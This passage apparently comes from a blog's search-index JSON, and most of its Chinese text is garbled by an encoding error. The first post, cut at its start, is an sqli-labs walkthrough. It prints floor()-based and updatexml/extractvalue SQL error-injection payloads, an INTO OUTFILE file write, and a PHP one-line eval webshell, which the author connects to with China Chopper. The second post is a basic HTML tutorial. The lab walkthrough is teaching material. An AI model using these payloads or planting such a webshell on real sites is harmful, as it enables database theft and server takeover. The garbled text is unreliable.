æ˜¾ç„¶å‰å››å…³ä½¿ç”¨unionè”åˆæŸ¥è¯¢çš„æ–¹æ³•åœ¨è¿™å…³ä¸èµ·ä½œç”¨ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¾—æ¢ä¸ªæ€è·¯äº†ï¼Œæç¤ºæŒ‡å‘äº†åŒæŸ¥è¯¢æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†ç›®å…‰æ”¾åˆ°åŒæŸ¥è¯¢æ³¨å…¥ä¸Šã€‚åŒæŸ¥è¯¢æ³¨å…¥åŸç†æµ…ææˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ä¸Šé¢çš„ç½‘å€ç®€å•äº†è§£åŒæŸ¥è¯¢æ³¨å…¥çš„è¿è¡ŒåŸç†ï¼Œäº†è§£ä¹‹åæˆ‘ä»¬å°†è¿™æ®µfloor()æŠ¥é”™çš„è¯­å¥æ‘˜å–å‡ºæ¥ï¼š 1and (select 1 from (select count(*),concat((æŸ¥è¯¢è¯­å¥),floor (rand(0)*2))x from information_schema.tables group by x)a) è¿™æ®µä»£ç å°±æ˜¯æˆ‘ä»¬è§£å¼€é—®é¢˜çš„å…³é”®æ‰€åœ¨ï¼Œå°†è¿™æ®µä»£ç ä¸­çš„æŸ¥è¯¢è¯­å¥æ”¹ä¸ºdatabase()å¹¶è¡¥å…¥åŸŸåä¹‹ä¸­ï¼Œå¯ä»¥å‘ç°æŠ¥é”™å·²ç»å›æ˜¾äº†å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åï¼š è¿™æ—¶æˆ‘ä»¬ä¹Ÿè®¸ä¼šæœ‰ç–‘é—®äº†ï¼Œä¸ºä»€ä¹ˆæ•°æ®åº“çš„åå­—å˜æˆäº†â€œsecurity1â€å‘¢ï¼Ÿå…¶å®è¿™ä¸æ˜¯å› ä¸ºæ•°æ®åº“çš„åå­—å˜äº†ï¼Œè€Œæ˜¯è¿™ä¸ªâ€œ1â€ä¸ºfloor()æŠ¥é”™è¯­å¥ä¸­è¾“å‡ºçš„ä¸€éƒ¨åˆ†ï¼Œæ— è®ºè¾“å‡ºä»€ä¹ˆéƒ½ä¼šå‡ºç°è¿™ä¸ªâ€œ1â€ï¼Œå› æ­¤æ•°æ®åº“çš„å®é™…åç§°ä»ç„¶ä¸ºâ€œsecurityâ€ã€‚ æ—¢ç„¶é—®é¢˜è§£å†³äº†ï¼Œé‚£ä¹ˆå°±è¿›å…¥äº†æ„‰å¿«çš„çˆ†åº“æµç¨‹äº†ï¼Œä½†æ˜¯å½“æˆ‘ä»¬åœ¨è·å–è¡¨ä¸­çš„æ•°æ®æ—¶ï¼Œå‡ºç°äº†è¿™ä¹ˆä¸€è¡Œï¼š Subquery returns more than 1 row æˆ‘ä»¬é¡µé¢çš„ä¿¡æ¯è¶…è¿‡äº†ä¸€è¡Œï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨äº†group_concatå‡½æ•°çš„æƒ…å†µä¸‹æ˜¾ç¤ºè¿™ä¸ªæŠ¥é”™è¯´æ˜äº†è¿™é‡Œçš„å­—ç¬¦é•¿åº¦è¶…è¿‡äº†64ä½ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨limitæ•°æ¥è¿›è¡Œä¸€ä¸ªä¸ªè¾“å‡ºï¼š 1select concat(åˆ—å) from æ•°æ®åº“å.æ•°æ®è¡¨å limit 0,1 æ–¹æ³•2ç”¨å®Œfloor()æŠ¥é”™åï¼Œæˆ‘å°±åœ¨æƒ³æœ‰æ²¡æœ‰å…¶ä»–çš„æŠ¥é”™æ–¹æ³•ä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒçš„æ•ˆæœå‘¢ï¼Œç»“æœè¿˜çœŸæœ‰ï¼šupdatexml(1,concat(0x7e, æŸ¥è¯¢è¯­å¥,0x7e),1)æˆ–è€… extractvalue(1,concat(0x7e,æŸ¥è¯¢è¯­å¥,0x7e))è¿™ä¸¤å¥ä»£ç çš„å…·ä½“è¯­æ³•å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªé“¾æ¥çš„æ•™ç¨‹ï¼šæ–¹æ³•2ä¸­çš„æŠ¥é”™æ³¨å…¥ è¿™é‡Œç®€å•ä»‹ç»ä¸‹è¿™ä¸¤å¥ä»£ç çš„æŠ¥é”™åŸç†ï¼Œè¿™ä¸¤å¥ä»£ç çš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦è®¾ç½®Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œè€Œâ€œ0x7eâ€ï¼Œå³â€œ~â€å¼€å¤´ä¸ç¬¦åˆå…¶è¯­æ³•ï¼Œconcat()å‡½æ•°ä¸ºå­—ç¬¦ä¸²è¿æ¥å‡½æ•°ä¸ç¬¦åˆè§„åˆ™ï¼Œå¯¼è‡´ä»£ç ä¸­æ‹¬å·å†…çš„ç»“æœä»¥é”™è¯¯çš„å½¢å¼æŠ¥å‡ºï¼Œè¾¾åˆ°ç›®çš„ã€‚ è€Œè¿™ä¸¤å¥ä»£ç çš„å­—ç¬¦ä¸²é™åˆ¶ä¸º32ä½ï¼Œå› æ­¤åœ¨è¿›è¡Œçˆ†è¡¨æµç¨‹æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥ä½¿ç”¨limitå‡½æ•°å°†æ•°æ®ä¸€è¡Œä¸€è¡Œæ˜¾ç¤ºå‡ºæ¥ï¼Œè¾¾åˆ°åŒæ ·æ•ˆæœã€‚ less-6æ˜¯åŒå¼•å·é—­åˆï¼Œè¿™ä¸¤å…³è€ƒçš„æ˜¯æŠ¥é”™æ³¨å…¥ã€‚ less-7è¾“å…¥idåï¼Œæˆ‘ä»¬å‘ç°è¿™æ¬¡çš„è¿”å›æ–‡å­—å¤šäº†ä¸€æ®µâ€œUse outfileâ€¦â€¦â€ï¼Œé‚£ä¹ˆç»“åˆæç¤ºæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­å‡ºè¿™é¢˜éœ€è¦æˆ‘ä»¬é€šè¿‡å†™å…¥æ–‡ä»¶å¹¶æ³¨å…¥ä¸€å¥è¯æœ¨é©¬æ¥å¯¹ç½‘é¡µå®ç°æ§åˆ¶ã€‚ é‚£ä¹ˆé¦–å…ˆï¼Œæˆ‘ä»¬ä¹Ÿè¦å…ˆæ‰¾åˆ°æ³¨å…¥ç‚¹ã€‚è¯•è¯•å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œå•å¼•å·åŠ æ‹¬å·ç­‰å¤šç§å½¢å¼ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ç­”æ¡ˆä¸ºå•å¼•å·åŠ ä¸Šä¸¤ä¸ªæ‹¬å·ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¼€å§‹è¿›è¡Œæ³¨å…¥ã€‚ é¦–å…ˆè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œoutfileæ–‡ä»¶æ³¨å…¥çš„æ—¶å€™å¿…é¡»è¦æœ‰rootæƒé™ï¼Œè€Œä¸”è¦çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„çš„åœ°å€ã€‚ä¸è¿‡ç”±äºè¿™ä¸ªé¶åœºæ˜¯æˆ‘ä»¬è‡ªå·±æ­çš„ï¼Œå› æ­¤å¾ˆå®¹æ˜“å¯ä»¥æ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯åœ¨ä¹‹å‰çš„é¶åœºä¸­ä½¿ç”¨@@datadiræŒ‡ä»¤æ¥è·å¾—æ•°æ®åº“çš„è·¯å¾„ï¼š å¥½æœ‰äº†ç»å¯¹è·¯å¾„ï¼Œç›´æ¥åŠ¨æ‰‹ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™æ®µä»£ç ï¼š 1select ... into outfile &quot;ç»å¯¹è·¯å¾„&quot; è¿™æ®µä»£ç å¯ä»¥å°†selectçš„å†…å®¹æ³¨å…¥è¿›ç»å¯¹è·¯å¾„ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬è¿™é‡Œæ³¨å…¥åˆ°ä¸€ä¸ª7.phpçš„æ–‡ä»¶ä¸‹ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œä½†æ˜¯è¿™æ¡ä»£ç ä¸ä¼šè¦†ç›–åŸæ–‡ä»¶ï¼Œå› æ­¤å†™å…¥æ—¶æœ€å¥½ä¸€æ¬¡æˆåŠŸï¼Œå¦‚æœè¦å†æ¬¡å†™å…¥åˆ™éœ€è¦æ›´æ¢æ–‡ä»¶åã€‚ è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œåœ¨å¤åˆ¶ç»å¯¹è·¯å¾„åï¼Œæˆ‘ä»¬éœ€è¦åœ¨â€œ\\â€åå†åŠ ä¸Šä¸€ä¸ªâ€œ\\â€æˆ–è€…å°†â€œ\\â€æ”¹æˆâ€œ/â€ï¼Œä¾‹å¦‚ï¼š 12D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\7.phpD:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php æœ‰ä»£ç åŸºç¡€çš„ä¸€å®šçŸ¥é“ï¼Œâ€œ\\â€ä»£è¡¨ç€è½¬ä¹‰å­—ç¬¦ï¼Œè€Œ\\\\æ‰æ˜¯æ„å‘³ç€å­—ç¬¦â€œ\\â€ã€‚è€Œâ€œ\\â€çš„è·¯å¾„æ˜¯windowsç³»ç»Ÿæ‰€ç‹¬æœ‰çš„è¡¨è¾¾æ–¹å¼ï¼Œä½†â€œ/â€è¡¨è¾¾çš„è·¯å¾„æ˜¯å¯ä»¥è¢«windowsã€linuxå’Œmacç­‰æ“ä½œç³»ç»Ÿå…±åŒè¯†åˆ«çš„ï¼Œå› æ­¤æ›´æ¨èç¬¬äºŒç§è¡¨è¾¾è·¯å¾„çš„æ–¹å¼ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ³¨å…¥ä¸€å¥è¯æœ¨é©¬äº†ï¼Œphpæ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬ä¸ºï¼š 1&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?&gt; å…¶ä¸­çš„chopperæ˜¯å€¼ï¼Œå‰é¢çš„POSTï¼ˆæˆ–è€…REQUESTç­‰ï¼‰ç”¨æ¥è·å–è¿™ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼ä¹‹åè¦ç”¨åˆ°ï¼Œå¯è‡ªå®šä¹‰ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å·¥å…·ï¼ˆèœåˆ€ï¼Œwebshellç­‰ï¼‰è¿›è¡Œè®¿é—®äº†ã€‚ æ³¨å…¥ä¹‹åæˆ‘ä»¬å‘ç°é¡µé¢è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æµè§ˆæœ¬åœ°æ–‡ä»¶ï¼Œå‘ç°äº†è¿™ä¸ª7.phpå·²ç»æˆåŠŸæ³¨å…¥è¿›æ–‡ä»¶å¤¹ä¸­äº†ï¼Œå¹¶ä¸”ä»£ç ä¹Ÿå·²ç»è¢«æˆåŠŸå†™å…¥ï¼š æ³¨å…¥æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥æå‡ºæˆ‘ä»¬çš„å·¥å…·äº†ï¼Œè¿™é‡Œä½¿ç”¨èœåˆ€ã€‚å¦‚ä¸Šï¼Œè¿æ¥æˆåŠŸï¼","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"HTMLåŸºç¡€å­¦ä¹ ","slug":"HTMLåŸºç¡€å­¦ä¹ ","date":"2021-09-22T09:24:52.000Z","updated":"2021-11-24T09:10:17.528Z","comments":true,"path":"2021/09/22/HTMLåŸºç¡€å­¦ä¹ /","link":"","permalink":"http://example.com/2021/09/22/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€ç”±äºphpè¯­è¨€å¸¸å¸¸è¢«åµŒå¥—åœ¨HTMLä¸­ç”¨äºå®ç°åŠ¨æ€é¡µé¢ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œç½‘é¡µæºä»£ç é˜…è¯»æ—¶æˆ‘ä»¬å¾€å¾€èƒ½çœ‹åˆ°HTMLè¯­è¨€ã€‚åœ¨å­¦ä¹ phpä¹‹å‰ï¼Œå…ˆå­¦ä¹ HTMLåŸºç¡€ï¼Œå¯ä»¥æ›´å¥½çš„å¸®åŠ©æˆ‘ä»¬äº†è§£ç½‘é¡µçš„å¸ƒå±€ï¼Œä¹Ÿèƒ½ä½¿æˆ‘ä»¬é˜…è¯»ä»£ç æ—¶æ›´å¥½çš„ç†è§£ä»£ç å«ä¹‰ã€‚","text":"å‰è¨€ç”±äºphpè¯­è¨€å¸¸å¸¸è¢«åµŒå¥—åœ¨HTMLä¸­ç”¨äºå®ç°åŠ¨æ€é¡µé¢ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œç½‘é¡µæºä»£ç é˜…è¯»æ—¶æˆ‘ä»¬å¾€å¾€èƒ½çœ‹åˆ°HTMLè¯­è¨€ã€‚åœ¨å­¦ä¹ phpä¹‹å‰ï¼Œå…ˆå­¦ä¹ HTMLåŸºç¡€ï¼Œå¯ä»¥æ›´å¥½çš„å¸®åŠ©æˆ‘ä»¬äº†è§£ç½‘é¡µçš„å¸ƒå±€ï¼Œä¹Ÿèƒ½ä½¿æˆ‘ä»¬é˜…è¯»ä»£ç æ—¶æ›´å¥½çš„ç†è§£ä»£ç å«ä¹‰ã€‚ ä¸€ã€HTMLè¯­è¨€è¯­æ³•1.HTMLä¸­çš„è¯­æ³•åŸºæœ¬ HTMLæ–‡ä»¶ä¸­æ˜¯ä»¥æ ‡ç­¾å¯¹æˆ–æ ‡ç­¾æ¥æ ‡è®°ç½‘é¡µç»“æ„å’Œæ˜¾ç¤ºèµ„æ–™å†…å®¹çš„ã€‚æ ‡ç­¾å¯¹å¼€å§‹è¡¨ç°ä¸º&lt;xxx&gt;,æ ‡ç­¾ç»“æŸè¡¨ç°ä¸º&lt;/xxx&gt;ï¼Œå…¶ä¸­è¿˜æœ‰ä¸€äº›æ ‡ç­¾ä¸éœ€è¦ç»“æŸæ ‡ç­¾ï¼Œä¾‹å¦‚&lt;br&gt;å’Œ&lt;p&gt;ç­‰ï¼Œè¿™äº›æ ‡ç­¾è¢«ç§°ä¸ºç©ºæ ‡ç­¾ã€‚ è€ŒHTMLæ ‡ç­¾ä¹Ÿæ˜¯å…·æœ‰å±æ€§çš„ï¼Œå±æ€§æ˜¯ä¸ºHTMLå…ƒç´ æ‰€æä¾›çš„è¯´æ˜ä¿¡æ¯ã€‚HTMLçš„å±æ€§æ— å…ˆåæ¬¡åºä¹‹åˆ†ï¼Œå¹¶ä¸”å±æ€§è®¾ç½®æ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸è¿›è¡Œå±æ€§è®¾ç½®çš„è¯å±æ€§å°†ä¼šä»¥é»˜è®¤å€¼çš„å½¢å¼è¢«è°ƒç”¨ã€‚ä¸‹ä¾‹æ˜¯imgå›¾åƒæ ‡ç­¾æ ¼å¼ï¼š&lt;img src=&quot;http://www.baidu.com/img/baidu.gif&quot; height=&quot;200&quot; width=&quot;100&quot; /&gt;åœ¨ä¸Šè¿°è¯­å¥ä¸­ï¼Œsrcä¸ºè·¯å¾„ï¼Œheightä¸ºé«˜åº¦ï¼Œwidthä¸ºå®½åº¦ åœ¨HTMLçš„è¯­æ³•ä¸­ï¼ŒHTMLæ ‡ç­¾åå’Œå±æ€§éƒ½ä¸åŒºåˆ†å¤§å°å†™å­—æ¯ï¼Œå› æ­¤ï¼Œ&lt;br&gt;å’Œ&lt;BR&gt;è¿˜æœ‰&lt;Br&gt;ä¸‰è€…æ— ä»»ä½•åŒºåˆ«ã€‚ HTMLæºä»£ç ä¸­çš„å›è½¦ä¸ç©ºæ ¼éƒ½ä¸ä¼šåœ¨HTMLé¡µé¢ä¸­ä½“ç°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åº”ç”¨æ ¼å¼æ ‡ç­¾è¿›è¡Œæ–‡å­—æ’ç‰ˆã€‚ 2.HTMLæ³¨é‡Šå’Œæ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼Œæ³¨é‡Šä¸å½±å“ä»£ç çš„è¿è¡Œï¼Œå–„äºä½¿ç”¨æ³¨é‡Šä¹Ÿæ˜¯ä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜åº”è¯¥å…»æˆçš„è‰¯å¥½ä¹ æƒ¯ã€‚åœ¨HTMLè¯­è¨€ä¸­ï¼Œæ³¨é‡Šçš„æ–¹å¼æ¯”èµ·æˆ‘ä»¬å¸¸è§çš„cè¯­è¨€è¾ƒä¸ºç‰¹åˆ«ï¼Œæ³¨é‡Šä»¥&lt;!--å¼€å§‹ï¼Œä»¥--&gt;ç»“æŸ,ä¸¾ä¾‹å¦‚ä¸‹ï¼š 12345678&lt;html&gt; &lt;head&gt; &lt;!--æ³¨é‡Šä¿¡æ¯1--&gt; &lt;/head&gt; &lt;body&gt; &lt;!--æ³¨é‡Šä¿¡æ¯2--&gt; &lt;/body&gt;&lt;/html&gt; 3.HTMLå­—ç¬¦å®ä½“æœ‰äº›å­—ç¬¦ä¸²åœ¨HTMLè¯­è¨€ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ¯”å¦‚æ ‡ç­¾ä¸­ç”¨åˆ°çš„â€&lt;â€â€&gt;â€ç­‰ç­‰ï¼Œè¿™äº›å­—ç¬¦ä¸²åœ¨HTMLä¸­å°±ä¸å¯ç›´æ¥è¾“å‡ºã€‚è€Œä¸ºäº†è¾“å‡ºè¿™äº›å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°±éœ€è¦åº”ç”¨å­—ç¬¦å®ä½“æ¥è¡¨ç¤ºè¿™äº›å­—ç¬¦ä¸².å­—ç¬¦å®ä½“ç”±â€&amp;â€ã€å®ä½“åç§°å’Œâ€;â€æ„æˆï¼Œä»¥ä¸‹åˆ—å‡ºä¸€äº›å¸¸è§çš„å®ä½“åç§°ï¼Œåœ¨ä½¿ç”¨æ—¶è¦è®°å¾—åœ¨å…¶å·¦å³ä¸¤è¾¹åŠ ä¸Šâ€&amp;â€å’Œâ€;â€ï¼š å®ä½“åç§° è¾“å‡ºå­—ç¬¦ä¸² nbsp ç©ºæ ¼ amp &amp; lt &lt; gt &gt; quot â€œ äºŒã€HTMLæ–‡ä»¶ç»“æ„æ­£å¦‚ç¼–å†™Cè¯­è¨€æ—¶ä¸€å®šéœ€è¦ä¸€ä¸ªä¸»å‡½æ•°ä¸€æ ·ï¼Œç¼–å†™HTMLæ—¶ä¹Ÿéœ€è¦å‡ ä¸ªå…¨å±€æ¶æ„æ ‡ç­¾ï¼Œè¿™äº›æ ‡ç­¾å°†HTMLä»£ç åˆ†ä¸ºäº†ä¸‰ä¸ªéƒ¨åˆ†è¿›è¡Œç¼–å†™ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š 123456&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; ä¸‰ä¸ªæ ‡ç­¾å¯¹åˆ†åˆ«ä¸ºæœ€å¤–å±‚æ ‡ç­¾ï¼Œå¤´éƒ¨æ ‡è®°å’Œæ–‡æ¡£ä¸»ä½“æ ‡è®°ï¼Œä¸åŒçš„éƒ¨åˆ†èµ·åˆ°äº†ä¸åŒçš„ä½œç”¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ†åˆ«ä»‹ç»è¿™ä¸‰ä¸ªéƒ¨åˆ†ã€‚ 1.æœ€å¤–å±‚æ ‡ç­¾&lt;html&gt;å’Œ&lt;/html&gt;å°±æ˜¯æœ€å¤–å±‚æ ‡ç­¾ï¼Œä¸»è¦ä½œç”¨æ˜¯å‘Šè¯‰æµè§ˆå™¨è¿™ä¸ªHTMLæ–‡ä»¶çš„å¼€å§‹ç‚¹ä¸ç»“æŸç‚¹ã€‚è€Œç”±äºHTMLçš„ä¸ä¸¥è°¨æ€§ï¼Œåªéœ€è¦å­˜åœ¨å¼€å§‹æ ‡è®°HTMLæ–‡ä»¶å°±å¯ä»¥è¢«æµè§ˆå™¨è§£æã€‚ 2.å¤´éƒ¨æ ‡è®°&lt;head&gt;å’Œ&lt;/head&gt;æ ‡ç­¾ä¸ºå¤´éƒ¨æ ‡è®°ï¼Œåœ¨å®ƒä»¬ä¹‹é—´çš„æ–‡æœ¬æ˜¯å¤´ä¿¡æ¯ã€‚å¤´ä¿¡æ¯ä¸­ä¸»è¦åŒ…æ‹¬é¡µé¢çš„ä¸€äº›æè¿°è¯­å¥ï¼Œä»¥åŠå¼•å…¥CSSå’ŒJavaScriptè„šæœ¬ã€‚åœ¨å¤´ä¿¡æ¯ä¸­çš„æ ‡ç­¾ä½¿ç”¨é‡å°äºæ–‡æ¡£ä¸»ä½“æ ‡è®°ä¸­çš„æ ‡ç­¾ä½¿ç”¨é‡ï¼Œä¸»è¦ç”¨æ¥è¯´æ˜æ–‡ä»¶æ ‡é¢˜å’Œæ•´ä½“æ–‡ä»¶çš„å…¬å…±å±æ€§ã€‚ 3.æ–‡æ¡£ä¸»ä½“æ ‡è®°&lt;body&gt;å’Œ&lt;/body&gt;æ ‡ç­¾ä¸ºä¸»ä½“æ ‡è®°ï¼Œåœ¨ä»–ä»¬ä¹‹é—´çš„æ–‡æœ¬ç”¨æ¥æ”¾ç½®é¡µé¢ä¸­çš„æ˜¾ç¤ºå†…å®¹ã€‚ç½‘é¡µå‘ˆç°å‡ºçš„æ–‡å­—ã€å›¾ç‰‡ã€è¶…é“¾æ¥ç­‰ç­‰éƒ½è¦åœ¨è¿™ä¸ªæ ‡è®°ä¸­è¿›è¡Œå£°æ˜ã€‚æˆ‘ä»¬å­¦ä¹ çš„phpè¯­è¨€ä¹Ÿä¼šåµŒå¥—åœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚è€Œ&lt;body&gt;æ ‡ç­¾ä¹Ÿæœ‰è‡ªå·±çš„å±æ€§å€¼ï¼Œå¯ä»¥è®¾ç½®å…¶æ ‡ç­¾å±æ€§æ§åˆ¶æ•´ä¸ªé¡µé¢çš„é£æ ¼ï¼Œä¾‹å¦‚ï¼š&lt;body bgcolor=&quot;#FFFFFF&quot; text=&quot;red&quot;&gt;ä»¥ä¸Šä»£ç è®¾ç½®äº†æœ¬é¡µé¢çš„èƒŒæ™¯é¢œè‰²ä¸ºé»‘è‰²ï¼Œå­—ä½“é¢œè‰²ä¸ºçº¢è‰² åœ¨HTMLè¯­è¨€ä¸­ï¼Œé¢œè‰²å³å¯ä»¥ç”¨è‹±æ–‡å•è¯è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨RGBæ¥è¡¨ç¤º ä¸‰ã€é¡µé¢ç¼–è¾‘ç½‘é¡µæœ‰å¤šç§å¤šæ ·çš„å‘ˆç°æ–¹å¼ï¼Œç½‘é¡µä¸­ä¹Ÿå«æœ‰å¤§é‡å…ƒç´ ï¼Œæœ¬ç‰ˆå—å°†å¯¹æœ€åŸºæœ¬çš„æ–‡å­—ã€å›¾ç‰‡ä»¥åŠé“¾æ¥çš„ä»£ç è¿›è¡Œåˆ†æã€‚åŒæ—¶ï¼Œç”±äºåœ¨HTMLä»£ç çš„ç¼–å†™ä¸­ï¼Œç»å¸¸è¿ç”¨åˆ°CSSæ ·å¼ï¼Œæƒ³è¦äº†è§£CSSæ ·å¼å¯ä»¥å‚è€ƒä»¥ä¸‹é“¾æ¥ä¸­çš„CSSåŸºç¡€æ•™ç¨‹è¿›è¡Œå­¦ä¹ ï¼šCSSæ•™ç¨‹ 1.æ–‡å­— æ ¼å¼æ ‡ç­¾åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬æåˆ°äº†æ ¼å¼æ ‡ç­¾ï¼Œæ ¼å¼æ ‡ç­¾ä¸€èˆ¬ç”¨äºå®šä¹‰ç½‘é¡µçš„å¸ƒå±€ï¼Œä¸‹å›¾åˆ—ä¸¾äº†å¸¸ç”¨çš„æ ¼å¼æ ‡ç­¾ï¼š æ–‡æœ¬æ ‡ç­¾æ–‡æœ¬æ ‡ç­¾ç”¨äºå¼ºè°ƒæˆ–ç‰¹æ®Šè¯´æ˜ä¸€äº›æ–‡å­—ï¼Œä¸‹å›¾åˆ—ä¸¾äº†å¸¸ç”¨çš„æ–‡æœ¬æ ‡ç­¾ï¼š 2.å›¾åƒæˆ‘ä»¬å¸¸ç”¨åˆ°çš„å›¾ç‰‡æ ¼å¼ä¸€èˆ¬ä¸ºjpgã€pngå’Œgifï¼Œè¿™äº›æ ¼å¼çš„å›¾ç‰‡é€šè¿‡&lt;img&gt;æ ‡ç­¾æ’å…¥åˆ°HTMLæ–‡æ¡£ä¸­ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; bordre=&quot;&quot; srcï¼šéœ€è¦æŒ‡å®šä¸€ä¸ªåŒ…æ‹¬URLè·¯å¾„ååœ¨å†…çš„å›¾ç‰‡æ–‡ä»¶ altï¼šå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½“é¼ æ ‡æ‚¬åœå›¾ç‰‡ä¸Šæ—¶è¾“å‡ºè¯¥å­—ç¬¦ä¸² widthï¼šè®¾ç½®å›¾åƒå®½åº¦ï¼Œå•ä½åƒç´  heightï¼šè®¾ç½®å›¾åƒé«˜åº¦ï¼Œå•ä½åƒç´  borderï¼šè®¾ç½®ç›¸æ¡†çš„å®½åº¦ï¼Œå•ä½åƒç´  3.é“¾æ¥ç½‘é¡µä¸­å¾€å¾€æœ‰é“¾æ¥ä¹‹é—´çš„è·³è½¬ï¼Œé“¾æ¥æ–‡æ¡£ä¸­çš„æŒ‡å®šä½ç½®è¢«ç§°ä¸ºé”šç‚¹ã€‚åœ¨HTMLè¯­è¨€ä¸­ï¼Œ&lt;a&gt;æ ‡ç­¾è¢«ç”¨äºå®šä¹‰é”šç‚¹ä¸è¶…é“¾æ¥ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š&lt;a href=&quot;&quot; name=&quot;&quot; target=&quot;&quot;&gt;é“¾æ¥æ–‡å­—&lt;/a&gt; hrefï¼šæŒ‡å®šæ‰€é“¾æ¥ä½ç½®çš„URLè·¯å¾„ï¼Œç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„å‡å¯ nameï¼šæŒ‡å®šé¡µé¢çš„é”šç‚¹åç§° targetï¼šæŒ‡å®šæ‰“å¼€é“¾æ¥æ‰€ç”¨çš„æµè§ˆå™¨çª—å£åç§°ï¼Œé»˜è®¤ä¸ºåœ¨å½“å‰çª—å£æ‰“å¼€ 4.å…¶ä»–åœ¨é¡µé¢å‘ˆç°ä¸­è¿˜æœ‰å…¶ä»–çš„å½¢å¼ï¼Œä¾‹å¦‚è¡¨æ ¼ã€è¡¨å•ç­‰ã€‚æœ¬ç¯‡åšå®¢æ²¡æœ‰å¯¹å…¶è¿›è¡Œå…·ä½“ä»‹ç»ï¼Œä½†æˆ‘ä»¬ä¹Ÿè¦å¯¹å…¶å…·æœ‰é˜…è¯»èƒ½åŠ›ï¼Œå°¤å…¶æ˜¯åœ¨é¶åœºä¸­ä¹Ÿç»å¸¸ä½¿ç”¨çš„è¡¨æ ¼ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒä¸‹åˆ—é“¾æ¥è¿›è¡ŒHTMLè¡¨æ ¼å­¦ä¹ ï¼šHTMLè¡¨æ ¼æ•™ç¨‹ æ€»ç»“HTMLä¸»è¦è¢«ç”¨æ¥åœ¨webä¸Šå‘å¸ƒä¿¡æ¯ä»¥åŠå®Œæˆç®€å•å¸ƒå±€ï¼ŒåŒæ—¶ä¸ºäº†é¡µé¢ç¾è§‚ä¹Ÿä¼šè¿ç”¨CSSã€‚åœ¨å­¦ä¹ phpä¹‹å‰å¯¹webé¡µé¢å¸ƒå±€æœ‰è¿‡äº†è§£åï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°ç†è§£ä»£ç ä½œç”¨ï¼Œä½¿è‡ªå·±é˜…è¯»ä»£ç æ²¡æœ‰éšœç¢ã€‚æœ¬æ–‡æ€»ç»“äº†å¸¸è§çš„HTMLè¯­è¨€è¯­æ³•ï¼Œå¸Œæœ›èƒ½å¤Ÿåœ¨ä¹‹åçš„é¶åœºç»ƒä¹ ä¸­èµ·åˆ°å‚è€ƒä½œç”¨ã€‚ èµ„æ–™å¼•ç”¨ï¼šã€ŠPHPå­¦ä¹ æ‰‹å†Œã€‹ â€”â€”ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-webå‰ç«¯ 